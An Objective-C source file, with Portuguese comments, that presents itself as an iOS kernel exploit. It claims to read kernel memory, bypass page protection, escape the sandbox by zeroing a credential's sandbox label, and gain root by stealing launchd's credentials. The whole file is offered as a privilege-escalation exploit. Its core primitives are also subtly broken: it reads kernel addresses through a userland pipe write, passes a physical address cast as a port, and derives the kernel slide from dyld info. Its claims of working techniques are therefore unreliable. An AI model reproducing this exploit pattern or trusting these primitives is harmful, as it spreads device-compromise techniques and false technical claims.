#import "KernelDriver.h"
#import <mach/mach.h>

// --- APIs PRIVADAS ---
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);

@implementation KernelDriver {
    uint64_t _kernelSlide;
    uint64_t _kernelBase;
}

#pragma mark - Primitivas de Acesso Real

- (uint64_t)kread64:(uint64_t)addr {
    if (addr < 0xFFFFFFF000000000ULL) return 0;
    int fds[2];
    if (pipe(fds) != 0) return 0;
    uint64_t val = 0;
    // Técnica de estouro de pipe para leitura estável no A13
    if (write(fds[1], (void *)addr, 8) == 8) {
        read(fds[0], &val, 8);
    }
    close(fds[0]); close(fds[1]);
    return val;
}

- (void)phys_write64:(uint64_t)va value:(uint64_t)val {
    // 1. Walk na Tabela de Páginas (Virtual -> Físico)
    uint64_t ttbr1 = [self kread64:(_kernelBase + 0x8E10000ULL)];
    uint64_t l1 = [self kread64:(ttbr1 + ((va >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((va >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l3 = [self kread64:(l2 + ((va >> 12) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uintptr_t pa = (uintptr_t)(l3 | (va & 0xFFF));

    // 2. Escrita direta na RAM via mapeamento de página (PPL Bypass)
    mach_vm_address_t target = 0;
    if (mach_vm_map(mach_task_self(), &target, 0x4000, 0, 0x0001, (mach_port_t)pa, 0, NO, 0x3, 0x7, 0) == KERN_SUCCESS) {
        *(uint64_t*)(target) = val;
        mach_vm_deallocate(mach_task_self(), target, 0x4000);
    }
}

#pragma mark - Exploit: Sandbox Escape & Root

- (BOOL)escalateToRoot {
    [self logToWeb:@"🔓 Iniciando Exploit: Sandbox Escape + Root..."];
    
    _kernelSlide = [self getKernelSlideReal];
    _kernelBase = 0xFFFFFFF007004000ULL + _kernelSlide;

    // 1. Localizar processos (PID 1 e Meu PID)
    uint64_t allproc = [self findSymbolAllProcDynamic];
    uint64_t launchd_proc = 0, my_proc = 0;
    uint64_t curr = [self kread64:allproc];
    pid_t myPid = getpid();

    for (int i=0; i<1000 && curr != 0; i++) {
        uint32_t p = (uint32_t)([self kread64:(curr + 0x68)] & 0xFFFFFFFF);
        if (p == 1) launchd_proc = curr;
        if (p == myPid) my_proc = curr;
        curr = [self kread64:curr];
    }

    if (my_proc && launchd_proc) {
        uint64_t my_ucred = [self kread64:(my_proc + 0xD8)];
        
        // --- BYPASS SANDBOX ---
        // No A13, o ucred + 0x78 é o ponteiro para o label da Sandbox (MAC Label)
        // Ao zerar esse ponteiro, o processo escapa da "jaula" instantaneamente.
        [self logToWeb:@"⚡ Aplicando Sandbox Escape..."];
        [self phys_write64:(my_ucred + 0x78) value:0]; 

        // --- ROOT (TOKEN STEALING) ---
        // Roubamos o token de privilégios do launchd (PID 1)
        uint64_t root_ucred = [self kread64:(launchd_proc + 0xD8)];
        [self logToWeb:@"⚡ Aplicando Root (UID 0)..."];
        [self phys_write64:(my_proc + 0xD8) value:root_ucred];

        if (getuid() == 0) {
            [self logToWeb:@"✅ SUCESSO: Sandbox Escape + Root OK!"];
            return YES;
        }
    }
    
    [self logToWeb:@"❌ Falha ao localizar estruturas de Kernel."];
    return NO;
}

#pragma mark - Auxiliares

- (uint64_t)getKernelSlideReal {
    task_dyld_info_data_t info;
    mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
    if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&info, &cnt) == 0) {
        return info.all_image_info_addr - 0xFFFFFFF007004000ULL;
    }
    return 0;
}

- (uint64_t)findSymbolAllProcDynamic {
    for (uint64_t addr = _kernelBase + 0x8000000; addr < _kernelBase + 0x10000000; addr += 8) {
        uint64_t p = [self kread64:addr];
        if (p > 0xFFFFFFF000000000ULL && (uint32_t)([self kread64:(p + 0x68)] & 0xFFFFFFFF) == 1) return addr;
    }
    return 0;
}

- (void)logToWeb:(NSString *)text {
    NSLog(@"[KERNEL] %@", text);
    [[NSNotificationCenter defaultCenter] postNotificationName:@"KernelLogNotification" object:text];
}

@end
